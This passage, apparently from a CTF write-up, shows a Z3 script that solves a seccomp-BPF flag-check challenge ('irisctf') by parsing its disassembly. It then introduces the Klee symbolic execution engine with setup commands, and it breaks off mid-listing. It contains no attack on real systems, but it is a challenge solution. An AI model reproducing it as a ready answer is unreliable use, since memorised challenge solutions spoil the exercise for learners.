solver&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s = Solver()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;INT_BITS = &lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;getFlag&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;model&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    flag = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        t = model[args[i]].as_long()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        flag += &lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;.fromhex(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(t)[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;:]).decode()[::-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        t = model[args2[i]].as_long()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        flag += &lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;.fromhex(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(t)[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;:]).decode()[::-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;[+] Flag: irisctf&amp;#123;&amp;#123;&lt;span class=&#34;subst&#34;&gt;&amp;#123;flag&amp;#125;&lt;/span&gt;&amp;#125;&amp;#125;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# using BitVecVals instead of python integers because &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# they act like a &amp;quot;constant symbol&amp;quot;, and automatically get &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# truncated according to size, etc &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;A = BitVecVal(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, INT_BITS)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;X = BitVecVal(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, INT_BITS)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sys_number = BitVecVal(&lt;span class=&#34;number&#34;&gt;0x1337&lt;/span&gt;, INT_BITS)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;arch = BitVecVal(&lt;span class=&#34;number&#34;&gt;0xc000003e&lt;/span&gt;, INT_BITS)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# splitting our qwords into pairs of dwords, higher and lower &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# since bpf uses only 32-bit integers at a maximum anyways &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;args = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;args2 = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# zero initialised since mem is being initialised in the program &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mem = [&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] * &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# args is lower DWORD&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    x = BitVec(&lt;span class=&#34;string&#34;&gt;f&amp;quot;args[&lt;span class=&#34;subst&#34;&gt;&amp;#123;i&amp;#125;&lt;/span&gt;]&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    args.append(x)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        s.add(Extract(j + &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;, j, x) &amp;gt;= &lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        s.add(Extract(j + &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;, j, x) &amp;lt;=&lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# args2 is higher DWORD &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    x = BitVec(&lt;span class=&#34;string&#34;&gt;f&amp;quot;args2[&lt;span class=&#34;subst&#34;&gt;&amp;#123;i&amp;#125;&lt;/span&gt;]&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    args2.append(x)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        s.add(Extract(j + &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;, j, x) &amp;lt;= &lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        s.add(Extract(j + &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;, j, x) &amp;gt;= &lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;disasm.txt&amp;quot;&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; disassembly:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; line_number, line &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;enumerate&lt;/span&gt;(disassembly):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        line = line.strip()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# ignore all return and kill statements, not needed for our solver&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;return&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; line:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot; &amp;gt;&amp;gt; &amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; line: &lt;span class=&#34;comment&#34;&gt;# upper DWORD being extracted&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            line = line.replace(&lt;span class=&#34;string&#34;&gt;&amp;quot; &amp;gt;&amp;gt; 32&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;).replace(&lt;span class=&#34;string&#34;&gt;&amp;quot;args&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;args2 &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# lines where constraint for our input comes in &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;goto&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; line:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            temp_line = line.split()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            lhs = temp_line[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;][&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            rhs = temp_line[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;][:-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            rhs = &lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(rhs)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            s.add(A == rhs)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;exec&lt;/span&gt;(line)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# if A is an integer and not a BitVector, make sure it is &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# within the 32-bit limit &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;type&lt;/span&gt;(A) == &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            A = A % (&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; ** INT_BITS)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;assert&lt;/span&gt; s.check() == sat&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;model = s.model()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;getFlag(model)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;That&#39;s one way to solve it, but one way doesn&#39;t cut it, does it?&lt;/p&gt;
&lt;p&gt;After the CTF, I came across &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9rbGVlLmdpdGh1Yi5pbw==&#34;&gt;Klee&lt;/span&gt;. Klee, you could say, is a Symbolic Virtual Machine (Solver), that allows you to symbolically execute a C source file. This is advantageous for 2 main reasons:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;You don&#39;t have to bother about having to convert C source to Python (to have to apply Z3 on it to solve symbolically)&lt;/li&gt;
&lt;li&gt;While converting from C to Python, we don&#39;t have to worry about stuff like signedness and typecasting 😃&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Klee is a symbolic execution engine that explores program paths symbolically, treating variables as symbols rather than with concrete values. It is built on top of the LLVM compiler infrastructure, so this integration allows it to work easily with programs written in C/C++, and leverage LLVM capabilities for program analysis and transformation.&lt;/p&gt;
&lt;h4 id=&#34;install-klee&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#install-klee&#34;&gt;#&lt;/a&gt; &lt;strong&gt;Install Klee&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Install &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZW5naW5lL2luc3RhbGwv&#34;&gt;Docker&lt;/span&gt; (since that is what I used to run Klee on this)&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;docker pull klee/klee&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker run --&lt;span class=&#34;built_in&#34;&gt;rm&lt;/span&gt; -ti --&lt;span class=&#34;built_in&#34;&gt;ulimit&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;stack=-1:-1&amp;#x27;&lt;/span&gt; klee/klee&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;convert-c-source-to-bitcode&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#convert-c-source-to-bitcode&#34;&gt;#&lt;/a&gt; &lt;strong&gt;Convert C source to Bitcode&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;(Bitcode is the format of code that Klee operates on. It is the LLVM IR representation of the code used by compiler chains like  &lt;code&gt;clang&lt;/code&gt; )&lt;br /&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;clang -emit-llvm -c &amp;lt;filename&amp;gt;.c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;klee &amp;lt;filename&amp;gt;.bc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;This will generate a directory with a number (indicating the number of times you&#39;ve run Klee on the file so far),  &lt;code&gt;klee-last&lt;/code&gt;  is the directory with the information on the file that was last symbolically executed with Klee.&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;ls&lt;/span&gt; klee-assert/ | grep assert &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ktest-tool klee-latest/&amp;lt;files_output_from_previous_command&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;The files are output in a format  &lt;code&gt;test&amp;lt;number&amp;gt;.assert.err&lt;/code&gt; .&lt;/p&gt;
&lt;p&gt;To run Klee on your C-source, simply run&lt;br /&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ktest-tool klee-last/test&amp;lt;number&amp;gt;.ktest&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;To generate the filter.c files to run using Klee, you can do the following&lt;/strong&gt;:&lt;br /&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;seccomp-tools dump ./chal -l 8 &amp;gt; full_disasm.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
&amp;lt;br&amp;gt;&lt;/p&gt;
&lt;p&gt;Followed by a script to split these files and parse them, then convert them to C files in the format the Klee expects&lt;br /&gt;
&lt;figure class=&#34;highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span 